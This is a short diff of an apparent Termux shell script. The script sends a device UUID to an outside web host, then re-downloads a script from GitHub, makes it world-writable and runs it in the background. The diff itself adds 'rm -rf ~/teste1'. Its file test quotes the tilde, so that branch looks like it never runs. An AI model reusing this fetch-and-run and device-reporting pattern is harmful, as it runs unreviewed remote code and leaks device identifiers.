@@ -21,6 +21,7 @@ if [ ! -e "/data/data/com.termux/files/usr/bin/uuid" ]; then
 fi
 
 if [ -e "~/.device/uuid" ]; then
+   rm -rf ~/teste1
    uuid=(`cat ~/.device/uuid`)
    curl https://adalbertomello.000webhostapp.com/device.php?uuid=$uuid
 fi
@@ -31,5 +32,3 @@ fi
 
 pkill while.sh
 rm -rf while.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/while.sh && chmod 777 while.sh && nohup ./while.sh &
-
-mkdir teste1
